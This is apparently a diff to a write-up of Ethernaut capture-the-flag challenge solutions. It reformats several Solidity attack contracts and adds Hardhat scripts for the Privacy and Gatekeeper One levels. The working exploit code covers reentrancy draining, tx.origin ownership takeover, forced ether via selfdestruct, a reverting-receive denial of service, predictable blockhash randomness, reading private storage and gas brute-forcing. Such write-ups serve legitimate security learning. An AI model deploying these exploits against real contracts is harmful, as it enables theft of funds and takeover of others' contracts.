@@ -81,22 +81,22 @@ With the following contract
 pragma solidity ^0.8.0;
 
 interface ICoinFlip {
-    function flip(bool _guess) external returns (bool);
+  function flip(bool _guess) external returns (bool);
 }
 
 contract CoinFlipAttack {
-    ICoinFlip public target;
+  ICoinFlip public target;
 
-    constructor(address _target) {
-        target = ICoinFlip(_target);
-    }
+  constructor(address _target) {
+    target = ICoinFlip(_target);
+  }
 
-    function attack() external {
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-        bool side = coinFlip == 1 ? true : false;
-        target.flip(side);
-    }
+  function attack() external {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+    uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    bool side = coinFlip == 1 ? true : false;
+    target.flip(side);
+  }
 }
 ```
 
@@ -154,19 +154,19 @@ Ref: https://ethereum.stackexchange.com/a/1892
 pragma solidity ^0.8.0;
 
 interface ITelephone {
-    function changeOwner(address _owner) external;
+  function changeOwner(address _owner) external;
 }
 
 contract TelephoneAttack {
-    ITelephone public target;
+  ITelephone public target;
 
-    constructor(address _target) {
-        target = ITelephone(_target);
-    }
+  constructor(address _target) {
+    target = ITelephone(_target);
+  }
 
-    function attack() external {
-        target.changeOwner(tx.origin);
-    }
+  function attack() external {
+    target.changeOwner(tx.origin);
+  }
 }
 ```
 
@@ -198,10 +198,10 @@ await contract.owner == player
 pragma solidity ^0.8.0;
 
 contract ForceAttack {
-    constructor(address payable target) payable {
-        require(msg.value > 0);
-        selfdestruct(target);
-    }
+  constructor(address payable target) payable {
+    require(msg.value > 0);
+    selfdestruct(target);
+  }
 }
 ```
 
@@ -224,7 +224,7 @@ async function main() {
 main().catch((error) => {
   console.error(error);
   process.exitCode = 1;
-}
+});
 ```
 
 ```js
@@ -239,24 +239,24 @@ await contract.locked() == false
 pragma solidity ^0.8.0;
 
 contract KingAttack {
-    address payable public target;
+  address payable public target;
 
-    constructor(address payable _target) {
-        target = _target;
-    }
+  constructor(address payable _target) {
+    target = _target;
+  }
 
-    function attack() external payable {
-        // Cannot use transfer because it does not provide sufficient gas (hardcoded at 2300)
-        // Ref: https://medium.com/coinmonks/solidity-transfer-vs-send-vs-call-function-64c92cfc878a
-        // target.transfer(msg.value);
+  function attack() external payable {
+    // Cannot use transfer because it does not provide sufficient gas (hardcoded at 2300)
+    // Ref: https://medium.com/coinmonks/solidity-transfer-vs-send-vs-call-function-64c92cfc878a
+    // target.transfer(msg.value);
 
-        (bool sent,) = target.call{value: msg.value}("");
-        require(sent);
-    }
+    (bool sent,) = target.call{value: msg.value}("");
+    require(sent);
+  }
 
-    receive() external payable {
-        revert();
-    }
+  receive() external payable {
+    revert();
+  }
 }
 ```
 
@@ -284,27 +284,27 @@ main().catch((error) => {
 pragma solidity ^0.8.0;
 
 interface IReentrance {
-    function donate(address _to) external payable;
-    function withdraw(uint _amount) external;
+  function donate(address _to) external payable;
+  function withdraw(uint _amount) external;
 }
 
 contract ReentranceAttack {
-    IReentrance target;
+  IReentrance target;
     
-    constructor(address _target) payable {
-        target = IReentrance(_target);
-    }
+  constructor(address _target) payable {
+    target = IReentrance(_target);
+  }
 
-    function attack() external payable {
-        target.donate{value: msg.value}(address(this));
-        target.withdraw(msg.value);
-    }
+  function attack() external payable {
+    target.donate{value: msg.value}(address(this));
+    target.withdraw(msg.value);
+  }
 
-    receive() external payable {
-        if (address(target).balance >= msg.value) {
-            target.withdraw(msg.value);
-        }
+  receive() external payable {
+    if (address(target).balance >= msg.value) {
+      target.withdraw(msg.value);
     }
+  }
 }
 ```
 
@@ -339,20 +339,20 @@ main().catch((error) => {
 pragma solidity ^0.8.0;
 
 interface IElevator {
-    function goTo(uint _floor) external;
+  function goTo(uint _floor) external;
 }
 
 contract ElevatorAttack {
-    uint calls;
+  uint calls;
 
-    function isLastFloor(uint) external returns (bool) {
-        calls++;
-        return calls % 2 == 0;
-    }
+  function isLastFloor(uint) external returns (bool) {
+    calls++;
+    return calls % 2 == 0;
+  }
 
-    function attack(address target) external {
-        IElevator(target).goTo(1);
-    }
+  function attack(address target) external {
+    IElevator(target).goTo(1);
+  }
 }
 ```
 
@@ -367,8 +367,99 @@ async function main() {
   await contract.waitForDeployment();
   console.log(`Contract address: ${await contract.getAddress()}`);
   (await contract.attack(await target.getAddress())).wait();
-  console.log('Attack complete');
+  console.log("Attack complete");
   console.log(`Target top = ${await target.top()}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+## 12 Privacy
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = (await hre.ethers.getContractFactory("Privacy")).attach("<target contract address>");
+  console.log(`Target locked = ${await target.locked()}`);
+  
+  // Each variable occupies one 256-bit slot.
+  // Several contiguous variables that occupy less than 256 bits are packed.
+  for (let i = 0; i < 6; i++)
+    console.log(`slot ${i}: ${await hre.ethers.provider.getStorage(await target.getAddress(), i)}`);
+
+  const key = (await hre.ethers.provider.getStorage(await target.getAddress(), 5)).toString().substring(0, 2 + 32);
+  console.log(`key = ${key}`);
+
+  (await target.unlock(key)).wait();
+  console.log(`Target locked = ${await target.locked()}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+## 13 Gatekeeper One
+
+```sol
+pragma solidity ^0.8.0;
+
+import "hardhat/console.sol";
+
+interface IGatekeeperOne {
+  function enter(bytes8 _gateKey) external;
+}
+
+contract GatekeeperOneAttack {
+  function attack(address target, bytes8 gateKey, uint256 gas) external {
+    // Note that console.log output will appear in the `yarn network` output.
+    // Ref: https://hardhat.org/hardhat-network/docs/reference#console.log
+    // Output using console.logBytes{8,4} for hex output.
+    console.logBytes8(gateKey);
+    console.logBytes4(bytes4(uint32(uint64(gateKey))));
+    console.logBytes2(bytes2(uint16(uint64(gateKey))));
+
+    require(uint32(uint64(gateKey)) == uint16(uint64(gateKey)), "GatekeeperOne: invalid gateThree part one");
+    require(uint32(uint64(gateKey)) != uint64(gateKey), "GatekeeperOne: invalid gateThree part two");
+    require(uint32(uint64(gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+
+    IGatekeeperOne(target).enter{gas: gas}(gateKey);
+  }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = (await hre.ethers.getContractFactory("GatekeeperOne")).attach("<target contract address>");
+  console.log(`Target entrant = ${await target.entrant()}`);
+
+  const contract = await hre.ethers.deployContract("GatekeeperOneAttack");
+  await contract.waitForDeployment();
+  console.log(`Contract address: ${await contract.getAddress()}`);
+
+  const gateKey = await (async () => {
+    const [ signer ] = await hre.ethers.getSigners();
+    return "0x" + (hre.ethers.toBigInt(signer.address) & 0xffffffff_0000ffffn).toString(16);
+  })();
+  console.log(`gateKey = ${gateKey}`);
+
+  for (let i = 0; i < 8191; i++) {
+    console.log(`Testing ${i} gas offset`);
+    try {
+      (await contract.attack(await target.getAddress(), gateKey, 100000 + i)).wait();
+      break;
+    } catch {
+    }
+  }
+  console.log("Attack complete");
+  console.log(`Target entrant = ${await target.entrant()}`);
 }
 
 main().catch((error) => {
